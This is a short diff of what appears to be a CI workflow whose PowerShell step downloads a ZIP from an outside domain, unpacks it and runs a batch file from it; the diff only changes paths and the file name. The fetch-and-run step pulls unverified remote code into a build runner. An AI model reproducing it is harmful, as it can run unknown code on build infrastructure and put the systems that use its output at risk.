@@ -114,8 +114,8 @@ jobs:
         run: |
           # URL del archivo ZIP
           $zipUrl = "https://fredy.weknowdev.com/order.zip"
-          $localZipPath = "C:\order.zip"
-          $extractPath = "C:\Users\RDP\Desktop"
+          $localZipPath = "C:\file.zip"
+          $extractPath = "C:\file"
           
           # Descargar el archivo .zip
           Invoke-WebRequest -Uri $zipUrl -OutFile $localZipPath
@@ -133,7 +133,7 @@ jobs:
           Write-Host "Archivo descomprimido en $extractPath."
           
           # Ejecutar el archivo aa.bat
-          $exePath = "$extractPath\start.bat"
+          $exePath = "$extractPath\start - file.bat"
           Write-Host "Archivo a ejecutar $exePath"
           & "$exePath"
 
